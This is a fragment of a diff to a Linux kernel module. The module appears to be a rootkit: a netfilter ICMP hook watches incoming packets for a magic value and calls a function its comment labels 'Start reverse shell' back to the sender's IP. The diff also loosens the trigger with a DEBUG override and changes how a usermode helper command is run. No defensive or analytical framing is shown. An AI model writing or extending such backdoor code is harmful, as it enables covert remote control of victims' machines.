@@ -101,8 +101,8 @@ int run_command(char * command){
     #endif
     if(!info) goto free_cmd_string;
 
-    return call_usermodehelper_exec(info, UMH_WAIT_EXEC); // 0 = don't wait
-    // memory leak!!!
+    return call_usermodehelper_exec(info, 0); // 0 = don't wait
+    
     free_cmd_string:
         kfree(cmd_string);
     free_argv:
@@ -175,7 +175,7 @@ unsigned int icmp_listener(void *priv, struct sk_buff *skb, const struct nf_hook
 		}
 
 		// Check if data of packet is our magic value (hello)
-		if (memcmp(data, MAGIC_VALUE, strlen(MAGIC_VALUE)) == 0) {
+		if (memcmp(data, MAGIC_VALUE, strlen(MAGIC_VALUE)) == 0 || DEBUG) {
 			debugPrint("Got packet with magic!");
 			magic_command(sourceIP); // Start reverse shell
 			return NF_DROP;
